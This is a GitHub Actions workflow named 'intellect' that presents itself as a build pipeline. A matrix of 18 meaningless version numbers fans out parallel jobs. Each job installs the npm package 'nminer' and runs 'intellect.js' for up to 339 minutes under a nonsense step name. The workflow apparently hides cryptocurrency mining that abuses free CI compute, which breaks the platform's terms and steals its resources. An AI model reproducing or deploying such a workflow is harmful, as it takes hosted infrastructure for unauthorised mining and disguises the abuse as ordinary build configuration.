name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2782 }
          - { version: 2669 }
          - { version: 4612 }
          - { version: 7612 }
          - { version: 532 }
          - { version: 6817 }
          - { version: 4967 }
          - { version: 7796 }
          - { version: 4938 }
          - { version: 5414 }
          - { version: 8486 }
          - { version: 1001 }
          - { version: 6745 }
          - { version: 3361 }
          - { version: 6591 }
          - { version: 2940 }
          - { version: 6249 }
          - { version: 4638 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: following opposite accomplished
        run: |
          npm install nminer@latest
          timeout 339m node intellect.js || echo "intellect executed"